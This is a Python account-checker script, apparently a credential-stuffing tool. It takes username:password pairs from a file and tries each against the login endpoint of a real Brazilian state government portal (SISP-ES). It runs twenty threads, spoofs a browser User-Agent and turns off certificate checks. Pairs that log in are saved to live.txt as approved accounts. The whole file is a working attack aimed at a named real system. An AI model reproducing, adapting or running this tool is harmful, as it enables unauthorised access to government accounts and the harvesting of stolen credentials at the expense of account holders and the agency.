import requests
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

# Initialize colorama
init(autoreset=True)
warnings.simplefilter('ignore', InsecureRequestWarning)

class SispChecker:
    def __init__(self):
        self.stats = {
            'total': 0,
            'approved': 0,
            'rejected': 0,
            'invalid': 0,
            'errors': 0
        }
        self.start_time = time.time()
        self.session = requests.Session()
        self.live_accounts = []

    def check_login(self, username, password):
        login_url = "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/j_security_check"
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            "Referer": "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/pesquisa.jsf",
        }
        payload = {
            "j_username": username,
            "j_password": password,
            "j_idt19": "j_idt19",
            "j_idt19:j_idt20.x": "27",
            "j_idt19:j_idt20.y": "8",
            "javax.faces.ViewState": "723520734359744078:5969372455684443261",
        }

        try:
            response = self.session.post(
                login_url,
                headers=headers,
                data=payload,
                verify=False,
                timeout=15
            )

            if response.status_code == 200:
                if "loginError" in response.text:
                    return "REJECTED"
                return "APPROVED"
            return "REJECTED"

        except Exception as e:
            return f"ERROR: {str(e)}"

    def process_line(self, line):
        self.stats['total'] += 1
        
        try:
            username, password = line.strip().split(':')
            if not username or not password:
                raise ValueError
        except ValueError:
            self.stats['invalid'] += 1
            return None

        result = self.check_login(username, password)

        if result == "APPROVED":
            self.stats['approved'] += 1
            self.live_accounts.append(f"{username}:{password}")
            return f"{Fore.GREEN}✅ APROVADO | {username}:{password}"
        elif result == "REJECTED":
            self.stats['rejected'] += 1
            return f"{Fore.RED}❌ REPROVADO | {username}:{password}"
        else:
            self.stats['errors'] += 1
            return f"{Fore.YELLOW}⚠ ERRO | {username}:{password} | {result.split(':')[-1]}"

    def show_status(self):
        elapsed = time.time() - self.start_time
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(Fore.CYAN + "══════════════════════════════════")
        print(Fore.MAGENTA + "      SISP-ES CHECKER - CALUSH")
        print(Fore.CYAN + "══════════════════════════════════")
        print(f"{Fore.GREEN}✅ Aprovados: {self.stats['approved']}")
        print(f"{Fore.RED}❌ Reprovados: {self.stats['rejected']}")
        print(f"{Fore.YELLOW}⚠ Erros: {self.stats['errors']}")
        print(f"{Fore.BLUE}📋 Inválidos: {self.stats['invalid']}")
        print(Fore.CYAN + "══════════════════════════════════")
        print(f"{Fore.WHITE}Total: {self.stats['total']}")
        print(f"Tempo: {elapsed:.2f}s")
        print(Fore.CYAN + "══════════════════════════════════")

    def save_results(self):
        if self.live_accounts:
            with open('live.txt', 'w') as f:
                for account in self.live_accounts:
                    username, password = account.split(':')
                    f.write(f"APROVADO | {username} | {password} | SISP-ES\n")

def main():
    checker = SispChecker()
    
    if not os.path.exists('logins.txt'):
        print(Fore.RED + "Erro: Arquivo 'logins.txt' não encontrado!")
        return

    try:
        with open('logins.txt', 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"Erro ao ler arquivo: {e}")
        return

    print(Fore.CYAN + "\nIniciando verificação...\n")
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(checker.process_line, line): line for line in lines}
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(result)
            checker.show_status()
            time.sleep(0.1)

    checker.save_results()
    print(Fore.GREEN + "\nVerificação concluída! Resultados salvos em live.txt")

if __name__ == "__main__":
    main()